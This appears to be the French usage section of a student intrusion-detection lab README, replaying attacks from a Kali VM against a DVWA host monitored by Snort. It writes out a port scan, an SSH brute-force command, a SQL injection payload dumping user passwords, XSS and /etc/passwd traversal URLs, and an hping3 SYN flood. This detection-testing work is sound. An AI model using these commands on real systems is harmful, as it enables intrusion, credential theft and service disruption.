# Utilisation

## Démarrer le système

### Snort (détection des intrusions)
Sur la VM Ubuntu :
```bash
sudo systemctl status snort
```
Si le service n'est pas actif :
```bash
sudo systemctl start snort
```
Pour voir les alertes en temps réel pendant une démonstration (au lieu du mode
service silencieux) :
```bash
sudo systemctl stop snort
sudo snort -A fast -q -c /etc/snort/snort.conf -i enp0s8 -l /var/log/snort
```
Les alertes s'affichent à l'écran et sont écrites dans `/var/log/snort/alert`.
Arrêter avec `Ctrl+C`, puis relancer le service normal :
```bash
sudo systemctl start snort
```

---

## Rejouer les attaques (depuis la VM Kali)

Prérequis : les deux VM (Ubuntu et Kali) doivent être démarrées et sur le même
réseau privé hôte. Vérifier la connexion :
```bash
ping -c 3 192.168.56.102
```

### Scénario 1 — Scan de ports (nmap)
```bash
nmap -sS 192.168.56.102
```

### Scénario 2 — Brute force SSH (hydra)
```bash
hydra -l vboxuser -P petite-liste.txt -t 4 ssh://192.168.56.102
```
*(`petite-liste.txt` : liste de mots de passe réduite, voir `scenarios/02-ssh-bruteforce.md`
pour la générer à partir de rockyou.txt)*

### Scénario 3 — Injection SQL
Depuis un navigateur sur Kali, se connecter à DVWA (`admin` / `password`,
sécurité réglée sur Low), puis sur la page SQL Injection, entrer dans le champ
User ID :

1' UNION SELECT user, password FROM users-- -

URL directe :

http://192.168.56.102/vulnerabilities/sqli/

### Scénario 4 — XSS et directory traversal

http://192.168.56.102/vulnerabilities/xss_r/?name=<script>alert(‘XSS’)</script>
http://192.168.56.102/vulnerabilities/fi/?page=../../../../etc/passwd


### Scénario 5 — SYN flood (hping3)
```bash
sudo hping3 -S --flood -p 80 192.168.56.102
```
Laisser tourner 5 à 10 secondes puis `Ctrl+C`. Attention : peut ralentir la VM
Ubuntu, c'est l'effet recherché.

### Vérifier la détection
Sur Ubuntu :
```bash
sudo tail -20 /var/log/snort/alert
```


## Voir les résultats dans Kibana
